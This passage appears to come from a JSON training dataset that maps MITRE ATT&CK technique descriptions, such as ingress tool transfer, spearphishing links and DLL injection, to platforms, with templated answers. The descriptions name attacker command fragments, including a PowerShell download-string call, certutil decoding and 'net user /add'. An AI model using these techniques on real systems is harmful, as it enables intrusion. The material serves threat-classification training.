      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\"). URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  Steal Application Access Tokens. These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. \n\nAdversaries may also utilize spearphishing links to Steal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.",
    "context": "",
    "output": "The provided description is related to MITRE technique Phishing: Spearphishing Link (T1566.002);\nTechnique Phishing: Spearphishing Link (T1566.002) is applicable to platforms: Linux,  Office 365,  SaaS,  Windows,  macOS, Google Workspace;\nTherefore, the given procedure description is related to platforms: Linux,  Office 365,  SaaS,  Windows,  macOS, Google Workspace.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\"). URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  Steal Application Access Tokens. These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. \n\nAdversaries may also utilize spearphishing links to Steal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.",
      "answer": "The provided description is related to MITRE technique Phishing: Spearphishing Link (T1566.002);\nTechnique Phishing: Spearphishing Link (T1566.002) is applicable to platforms: Linux,  Office 365,  SaaS,  Windows,  macOS, Google Workspace;\nTherefore, the given procedure description is related to platforms: Linux,  Office 365,  SaaS,  Windows,  macOS, Google Workspace.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
    "context": "",
    "output": "The provided description is related to MITRE technique Masquerading: Masquerade Task or Service (T1036.004);\nTechnique Masquerading: Masquerade Task or Service (T1036.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
      "answer": "The provided description is related to MITRE technique Masquerading: Masquerade Task or Service (T1036.004);\nTechnique Masquerading: Masquerade Task or Service (T1036.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
    "context": "",
    "output": "The provided description is related to MITRE technique Exfiltration Over C2 Channel (T1041);\nTechnique Exfiltration Over C2 Channel (T1041) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
      "answer": "The provided description is related to MITRE technique Exfiltration Over C2 Channel (T1041);\nTechnique Exfiltration Over C2 Channel (T1041) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
      "answer": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Data from Local System (T1005);\nTechnique Data from Local System (T1005) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
      "answer": "The provided description is related to MITRE technique Data from Local System (T1005);\nTechnique Data from Local System (T1005) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Hijack Execution Flow: DLL Side-Loading (T1574.002);\nTechnique Hijack Execution Flow: DLL Side-Loading (T1574.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
      "answer": "The provided description is related to MITRE technique Hijack Execution Flow: DLL Side-Loading (T1574.002);\nTechnique Hijack Execution Flow: DLL Side-Loading (T1574.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL).  \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>). \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process. This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk. \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Injection: Dynamic-link Library Injection (T1055.001);\nTechnique Process Injection: Dynamic-link Library Injection (T1055.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL).  \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>). \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process. This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk. \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",
      "answer": "The provided description is related to MITRE technique Process Injection: Dynamic-link Library Injection (T1055.001);\nTechnique Process Injection: Dynamic-link Library Injection (T1055.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common Network Device CLI commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Create Account: Local Account (T1136.001);\nTechnique Create Account: Local Account (T1136.001) is applicable to platforms: Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common Network Device CLI commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
      "answer": "The provided description is related to MITRE technique Create Account: Local Account (T1136.001);\nTechnique Create Account: Local Account (T1136.001) is applicable to platforms: Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.",
    "context": "",
    "output": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Shortcut Modification (T1547.009);\nTechnique Boot or Logon Autostart Execution: Shortcut Modification (T1547.009) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.",
      "answer": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Shortcut Modification (T1547.009);\nTechnique Boot or Logon Autostart Execution: Shortcut Modification (T1547.009) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Injection (T1055);\nTechnique Process Injection (T1055) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
      "answer": "The provided description is related to MITRE technique Process Injection (T1055);\nTechnique Process Injection (T1055) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\n* **Import address table (IAT) hooking**, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Input Capture: Credential API Hooking (T1056.004);\nTechnique Input Capture: Credential API Hooking (T1056.004) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\n* **Import address table (IAT) hooking**, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.",
      "answer": "The provided description is related to MITRE technique Input Capture: Credential API Hooking (T1056.004);\nTechnique Input Capture: Credential API Hooking (T1056.004) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Query Registry (T1012);\nTechnique Query Registry (T1012) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "answer": "The provided description is related to MITRE technique Query Registry (T1012);\nTechnique Query Registry (T1012) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.?",
    "context": "",
